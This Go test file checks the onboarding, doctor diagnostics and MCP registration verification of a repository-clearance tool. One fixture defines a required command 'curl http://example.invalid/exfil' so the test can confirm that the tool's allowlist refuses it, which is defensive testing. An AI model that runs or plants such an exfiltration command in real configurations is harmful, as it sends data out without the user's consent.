package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/aniklavida/code-clearance/internal/mcpserver"
	"github.com/aniklavida/code-clearance/internal/schema"
)

var (
	builtBinaryPath string
	buildOnce       sync.Once
	buildErr        error
)

func getOrBuildBinary(t *testing.T) string {
	t.Helper()
	buildOnce.Do(func() {
		tmpDir, err := os.MkdirTemp("", "code-clearance-build-*")
		if err != nil {
			buildErr = err
			return
		}
		binPath := filepath.Join(tmpDir, "code-clearance")
		cmd := exec.Command("go", "build", "-o", binPath, ".")
		cmd.Dir = "."
		out, err := cmd.CombinedOutput()
		if err != nil {
			buildErr = fmt.Errorf("build code-clearance: %w\n%s", err, string(out))
			return
		}
		builtBinaryPath = binPath
	})

	if buildErr != nil {
		t.Fatalf("failed to build code-clearance binary: %v", buildErr)
	}
	return builtBinaryPath
}

func initTestGitRepo(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()

	runCmd := func(name string, args ...string) {
		cmd := exec.Command(name, args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=Test User",
			"GIT_AUTHOR_EMAIL=test@example.com",
			"GIT_COMMITTER_NAME=Test User",
			"GIT_COMMITTER_EMAIL=test@example.com",
		)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("%s %s failed: %v\n%s", name, strings.Join(args, " "), err, string(out))
		}
	}

	runCmd("git", "init")
	runCmd("git", "config", "user.name", "Test User")
	runCmd("git", "config", "user.email", "test@example.com")

	goMod := "module example.com/testrepo\n\ngo 1.22\n"
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte(goMod), 0644); err != nil {
		t.Fatal(err)
	}

	goMain := "package main\n\nfunc main() {}\n"
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte(goMain), 0644); err != nil {
		t.Fatal(err)
	}

	goTest := "package main\n\nimport \"testing\"\n\nfunc TestClean(t *testing.T) {}\n"
	if err := os.WriteFile(filepath.Join(dir, "main_test.go"), []byte(goTest), 0644); err != nil {
		t.Fatal(err)
	}

	runCmd("git", "add", ".")
	runCmd("git", "commit", "-m", "Initial commit")
	return dir
}

// Done When 1:
// On a clean state (simulating a clean machine: no clearance.yaml, no cached state),
// the sequence init -> doctor -> MCP registration -> first quick scan succeeds
// using only the public quick-start instructions.
func TestOnboarding_CleanStateSequence_InitDoctorMCPScan(t *testing.T) {
	ctx := context.Background()
	binPath := getOrBuildBinary(t)
	dir := initTestGitRepo(t)

	// Verify clean state
	if _, err := os.Stat(filepath.Join(dir, "clearance.yaml")); err == nil {
		t.Fatal("clean state violated: clearance.yaml already exists")
	}
	if _, err := os.Stat(filepath.Join(dir, ".clearance")); err == nil {
		t.Fatal("clean state violated: .clearance already exists")
	}
	if _, err := os.Stat(filepath.Join(dir, ".mcp.json")); err == nil {
		t.Fatal("clean state violated: .mcp.json already exists")
	}

	// Step 1a: Run init WITHOUT --approve (must NOT write clearance.yaml)
	var stdout, stderr bytes.Buffer
	code := runInit(ctx, []string{dir}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("init without --approve failed: code=%d stderr=%s", code, stderr.String())
	}
	if _, err := os.Stat(filepath.Join(dir, "clearance.yaml")); err == nil {
		t.Fatal("SECURITY/APPROVAL VIOLATION: init wrote clearance.yaml without explicit --approve")
	}
	if !strings.Contains(stdout.String(), "code-clearance init --approve") {
		t.Fatalf("expected init to instruct user to rerun with --approve, got:\n%s", stdout.String())
	}

	// Step 1b: Run init WITH --approve (must write clearance.yaml)
	stdout.Reset()
	stderr.Reset()
	code = runInit(ctx, []string{"--approve", dir}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("init with --approve failed: code=%d stderr=%s", code, stderr.String())
	}

	yamlPath := filepath.Join(dir, "clearance.yaml")
	data, err := os.ReadFile(yamlPath)
	if err != nil {
		t.Fatalf("expected clearance.yaml to be created: %v", err)
	}

	// Validate generated clearance.yaml against the versioned JSON Schema
	if err := schema.ValidateClearance(data); err != nil {
		t.Fatalf("generated clearance.yaml failed schema validation: %v", err)
	}

	// Step 2: Run doctor to confirm engine, adapters, and commands pass
	stdout.Reset()
	stderr.Reset()
	code = runDoctor(ctx, []string{dir}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("doctor failed on initialized repo: code=%d stdout=\n%s\nstderr=\n%s", code, stdout.String(), stderr.String())
	}
	doctorOut := stdout.String()
	if !strings.Contains(doctorOut, "[PASS]") {
		t.Fatalf("expected [PASS] in doctor output, got:\n%s", doctorOut)
	}
	if !strings.Contains(doctorOut, "All required checks passed") {
		t.Fatalf("expected doctor to report all required checks passed, got:\n%s", doctorOut)
	}

	// Step 3: MCP registration with explicit approval
	stdout.Reset()
	stderr.Reset()
	mcpConfigPath := filepath.Join(dir, ".mcp.json")
	code = runMCP(ctx, []string{"register", "--config", mcpConfigPath, "--command", binPath, "--args", "serve", "--approve"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("mcp register failed: code=%d stderr=%s", code, stderr.String())
	}
	if _, err := os.Stat(mcpConfigPath); err != nil {
		t.Fatalf("expected %s to be created: %v", mcpConfigPath, err)
	}
	if !strings.Contains(stdout.String(), "passive") {
		t.Fatalf("expected onboarding text to state that MCP servers are passive, got:\n%s", stdout.String())
	}

	// Step 4: Verify MCP registration through protocol handshake over stdio
	stdout.Reset()
	stderr.Reset()
	code = runMCP(ctx, []string{"verify", "--config", mcpConfigPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("mcp verify failed: code=%d stdout=\n%s\nstderr=\n%s", code, stdout.String(), stderr.String())
	}
	if !strings.Contains(stdout.String(), "verified") || !strings.Contains(stdout.String(), "run_clearance_scan") {
		t.Fatalf("expected verification to report responsive clearance tools, got:\n%s", stdout.String())
	}

	// Step 5: Run first quick scan against fixture repository
	stdout.Reset()
	stderr.Reset()
	code = runScan(ctx, []string{"--scope", "quick", "--json", dir}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("first quick scan failed: code=%d stderr=%s stdout=%s", code, stderr.String(), stdout.String())
	}

	var rep map[string]any
	if err := json.Unmarshal(stdout.Bytes(), &rep); err != nil {
		t.Fatalf("scan output is not valid JSON: %v\noutput: %s", err, stdout.String())
	}
	outcome, _ := rep["outcome"].(string)
	if outcome != "cleared" && outcome != "cleared_with_residual_risk" {
		t.Fatalf("expected cleared outcome on clean fixture repo, got: %q", outcome)
	}
}

// Done When 2 (a):
// doctor correctly diagnoses a missing scanner and the diagnostic message names the next action.
func TestDoctor_DiagnosesMissingScanner_NamesAction(t *testing.T) {
	ctx := context.Background()
	dir := initTestGitRepo(t)

	// Create clearance.yaml requiring a missing scanner tool
	missingConfig := `{
  "version": "v1",
  "adapters": {
    "required": ["nonexistent-scanner-tool"],
    "optional": []
  },
  "paths": {
    "include": ["**/*"],
    "exclude": [".git/**"]
  },
  "scopes": {
    "quick": { "allow_dirty": true },
    "full": { "allow_dirty": false },
    "release": { "allow_dirty": false }
  },
  "policy": {
    "blocking_severities": ["critical", "high"],
    "allow_dirty": false,
    "accepted_risks": [],
    "human_required_classes": []
  },
  "commands": {
    "required": [],
    "optional": []
  },
  "limits": {
    "timeout_seconds": 30,
    "max_concurrency": 4
  },
  "outcomes": {
    "minimum_evidence": {
      "cleared": {
        "required_adapters_must_pass": true,
        "zero_blocking_findings": true,
        "clean_tree_required": true
      },
      "cleared_with_residual_risk": {
        "accepted_risks_unexpired": true
      },
      "blocked": {
        "blocking_finding_present": true
      },
      "incomplete": {
        "missing_required_adapter": true,
        "crashed_or_timed_out": true
      }
    }
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "clearance.yaml"), []byte(missingConfig), 0644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	code := runDoctor(ctx, []string{dir}, &stdout, &stderr)
	if code == 0 {
		t.Fatal("expected doctor to exit with non-zero code on missing required scanner")
	}

	out := stdout.String()
	if !strings.Contains(out, "nonexistent-scanner-tool not found on PATH") {
		t.Fatalf("expected output to state scanner is missing on PATH, got:\n%s", out)
	}
	if !strings.Contains(out, "adapters.optional") {
		t.Fatalf("expected output to suggest moving to adapters.optional, got:\n%s", out)
	}
	if !strings.Contains(strings.ToLower(out), "then rerun") {
		t.Fatalf("expected output to state safe next action ('then rerun'), got:\n%s", out)
	}
}

// Done When 2 (b):
// doctor correctly diagnoses a broken repository-defined command and the diagnostic message names the next action.
func TestDoctor_DiagnosesBrokenCommand_NamesAction(t *testing.T) {
	ctx := context.Background()
	dir := initTestGitRepo(t)

	// Case 1: Command invokes an unlisted binary (allowlist refusal)
	unlistedConfig := `{
  "version": "v1",
  "adapters": {
    "required": [],
    "optional": []
  },
  "paths": {
    "include": ["**/*"],
    "exclude": [".git/**"]
  },
  "scopes": {
    "quick": { "allow_dirty": true },
    "full": { "allow_dirty": false },
    "release": { "allow_dirty": false }
  },
  "policy": {
    "blocking_severities": ["critical", "high"],
    "allow_dirty": false,
    "accepted_risks": [],
    "human_required_classes": []
  },
  "commands": {
    "required": [
      {
        "name": "unauthorized-download",
        "run": "curl http://example.invalid/exfil",
        "timeout_seconds": 10
      }
    ],
    "optional": []
  },
  "limits": {
    "timeout_seconds": 30,
    "max_concurrency": 4
  },
  "outcomes": {
    "minimum_evidence": {
      "cleared": {
        "required_adapters_must_pass": true,
        "zero_blocking_findings": true,
        "clean_tree_required": true
      },
      "cleared_with_residual_risk": {
        "accepted_risks_unexpired": true
      },
      "blocked": {
        "blocking_finding_present": true
      },
      "incomplete": {
        "missing_required_adapter": true,
        "crashed_or_timed_out": true
      }
    }
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "clearance.yaml"), []byte(unlistedConfig), 0644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	code := runDoctor(ctx, []string{dir}, &stdout, &stderr)
	if code == 0 {
		t.Fatal("expected doctor to fail on unlisted repository command")
	}

	out := stdout.String()
	if !strings.Contains(out, "command allowlist") {
		t.Fatalf("expected allowlist failure message, got:\n%s", out)
	}
	if !strings.Contains(out, "commands.allow") {
		t.Fatalf("expected remedy naming commands.allow, got:\n%s", out)
	}
	if !strings.Contains(strings.ToLower(out), "then rerun") {
		t.Fatalf("expected next action ('then rerun'), got:\n%s", out)
	}

	// Case 2: Allowlisted command that fails execution
	failingConfig := `{
  "version": "v1",
  "adapters": {
    "required": [],
    "optional": []
  },
  "paths": {
    "include": ["**/*"],
    "exclude": [".git/**"]
  },
  "scopes": {
    "quick": { "allow_dirty": true },
    "full": { "allow_dirty": false },
    "release": { "allow_dirty": false }
  },
  "policy": {
    "blocking_severities": ["critical", "high"],
    "allow_dirty": false,
    "accepted_risks": [],
    "human_required_classes": []
  },
  "commands": {
    "required": [
      {
        "name": "broken-test",
        "run": "go test ./nonexistent/package/...",
        "timeout_seconds": 10
      }
    ],
    "optional": []
  },
  "limits": {
    "timeout_seconds": 30,
    "max_concurrency": 4
  },
  "outcomes": {
    "minimum_evidence": {
      "cleared": {
        "required_adapters_must_pass": true,
        "zero_blocking_findings": true,
        "clean_tree_required": true
      },
      "cleared_with_residual_risk": {
        "accepted_risks_unexpired": true
      },
      "blocked": {
        "blocking_finding_present": true
      },
      "incomplete": {
        "missing_required_adapter": true,
        "crashed_or_timed_out": true
      }
    }
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "clearance.yaml"), []byte(failingConfig), 0644); err != nil {
		t.Fatal(err)
	}

	stdout.Reset()
	stderr.Reset()
	code = runDoctor(ctx, []string{dir}, &stdout, &stderr)
	if code == 0 {
		t.Fatal("expected doctor to fail on failing repository command")
	}

	out = stdout.String()
	if !strings.Contains(out, "exited with code") {
		t.Fatalf("expected exit code failure message, got:\n%s", out)
	}
	if !strings.Contains(out, "clearance.yaml") {
		t.Fatalf("expected remedy naming clearance.yaml, got:\n%s", out)
	}
	if !strings.Contains(strings.ToLower(out), "then rerun") {
		t.Fatalf("expected next action ('then rerun'), got:\n%s", out)
	}
}

// Done When 2 (c):
// doctor correctly diagnoses an unreachable MCP registration and the diagnostic message names the next action.
func TestDoctor_DiagnosesUnreachableMCP_NamesAction(t *testing.T) {
	ctx := context.Background()
	dir := initTestGitRepo(t)

	// Write clearance.yaml with default passing configuration
	validConfig := `{
  "version": "v1",
  "adapters": { "required": [], "optional": [] },
  "paths": { "include": ["**/*"], "exclude": [".git/**"] },
  "scopes": {
    "quick": { "allow_dirty": true },
    "full": { "allow_dirty": false },
    "release": { "allow_dirty": false }
  },
  "policy": {
    "blocking_severities": ["critical", "high"],
    "allow_dirty": false,
    "accepted_risks": [],
    "human_required_classes": []
  },
  "commands": { "required": [], "optional": [] },
  "limits": { "timeout_seconds": 30, "max_concurrency": 4 },
  "outcomes": {
    "minimum_evidence": {
      "cleared": { "required_adapters_must_pass": true, "zero_blocking_findings": true, "clean_tree_required": true },
      "cleared_with_residual_risk": { "accepted_risks_unexpired": true },
      "blocked": { "blocking_finding_present": true },
      "incomplete": { "missing_required_adapter": true, "crashed_or_timed_out": true }
    }
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "clearance.yaml"), []byte(validConfig), 0644); err != nil {
		t.Fatal(err)
	}

	// Write .mcp.json pointing to an unreachable/broken executable
	brokenMCP := `{
  "mcpServers": {
    "code-clearance": {
      "command": "/nonexistent/binary/code-clearance",
      "args": ["serve"]
    }
  }
}`
	if err := os.WriteFile(filepath.Join(dir, ".mcp.json"), []byte(brokenMCP), 0644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	code := runDoctor(ctx, []string{dir}, &stdout, &stderr)
	if code == 0 {
		t.Fatal("expected doctor to fail on unreachable MCP registration")
	}

	out := stdout.String()
	if !strings.Contains(out, "unreachable MCP registration") {
		t.Fatalf("expected diagnostic naming unreachable MCP registration, got:\n%s", out)
	}
	if !strings.Contains(out, "update host configuration") {
		t.Fatalf("expected remedy naming host configuration update, got:\n%s", out)
	}
	if !strings.Contains(strings.ToLower(out), "then rerun") {
		t.Fatalf("expected next action ('then rerun'), got:\n%s", out)
	}
}

// Done When 3:
// MCP host registration verification actually calls the registered server
// (a real tool invocation through the MCP protocol over stdio) rather than
// just checking that a config file was written.
func TestMCP_VerifyRegistration_InvokesProtocolCall(t *testing.T) {
	ctx := context.Background()
	binPath := getOrBuildBinary(t)
	tmpDir := t.TempDir()

	// 1. Valid registration: points to real code-clearance serve binary
	validConfigPath := filepath.Join(tmpDir, "valid-mcp.json")
	validCfg := mcpserver.HostConfigFile{
		MCPServers: map[string]mcpserver.ServerRegistration{
			"code-clearance": {
				Command: binPath,
				Args:    []string{"serve"},
			},
		},
	}
	data, _ := json.Marshal(validCfg)
	if err := os.WriteFile(validConfigPath, data, 0644); err != nil {
		t.Fatal(err)
	}

	// Verify that the MCP protocol handshake and tools/list execute successfully
	tools, err := mcpserver.VerifyRegistration(ctx, validConfigPath)
	if err != nil {
		t.Fatalf("expected VerifyRegistration to succeed against real binary: %v", err)
	}
	if len(tools) == 0 {
		t.Fatal("expected non-empty list of tools from MCP server")
	}

	hasClearanceScan := false
	for _, tool := range tools {
		if tool == "run_clearance_scan" || tool == "clearance_scan" {
			hasClearanceScan = true
			break
		}
	}
	if !hasClearanceScan {
		t.Fatalf("expected tools list to contain run_clearance_scan, got: %v", tools)
	}

	// 2. Proof that it actually calls the protocol rather than just checking file/binary existence:
	// Point to an executable that exists but does NOT speak MCP protocol (e.g. echo or cat)
	invalidProtocolConfigPath := filepath.Join(tmpDir, "invalid-protocol-mcp.json")
	invalidCfg := mcpserver.HostConfigFile{
		MCPServers: map[string]mcpserver.ServerRegistration{
			"code-clearance": {
				Command: "echo",
				Args:    []string{"not an mcp server"},
			},
		},
	}
	data2, _ := json.Marshal(invalidCfg)
	if err := os.WriteFile(invalidProtocolConfigPath, data2, 0644); err != nil {
		t.Fatal(err)
	}

	// Must fail because echo does not speak MCP protocol!
	_, err = mcpserver.VerifyRegistration(ctx, invalidProtocolConfigPath)
	if err == nil {
		t.Fatal("SECURITY/VERIFICATION FLAW: VerifyRegistration passed against 'echo' which does not speak MCP protocol")
	}
}

// Test guided install approval constraint:
// Never auto-install without an explicit approve step.
func TestDoctor_GuidedInstall_RequiresApproval(t *testing.T) {
	ctx := context.Background()
	dir := initTestGitRepo(t)

	cfg := `{
  "version": "v1",
  "adapters": { "required": ["missing-scanner"], "optional": [] },
  "paths": { "include": ["**/*"], "exclude": [".git/**"] },
  "scopes": { "quick": { "allow_dirty": true }, "full": { "allow_dirty": false }, "release": { "allow_dirty": false } },
  "policy": { "blocking_severities": ["critical", "high"], "allow_dirty": false, "accepted_risks": [], "human_required_classes": [] },
  "commands": { "required": [], "optional": [] },
  "limits": { "timeout_seconds": 30, "max_concurrency": 4 },
  "outcomes": { "minimum_evidence": { "cleared": { "required_adapters_must_pass": true, "zero_blocking_findings": true, "clean_tree_required": true }, "cleared_with_residual_risk": { "accepted_risks_unexpired": true }, "blocked": { "blocking_finding_present": true }, "incomplete": { "missing_required_adapter": true, "crashed_or_timed_out": true } } }
}`
	if err := os.WriteFile(filepath.Join(dir, "clearance.yaml"), []byte(cfg), 0644); err != nil {
		t.Fatal(err)
	}

	var stdout, stderr bytes.Buffer
	code := runDoctor(ctx, []string{"--install-missing", dir}, &stdout, &stderr)
	if code == 0 {
		t.Fatal("expected doctor to fail when --install-missing is invoked without --approve")
	}

	out := stdout.String()
	if !strings.Contains(out, "--install-missing requires explicit approval") {
		t.Fatalf("expected approval requirement message, got:\n%s", out)
	}
}
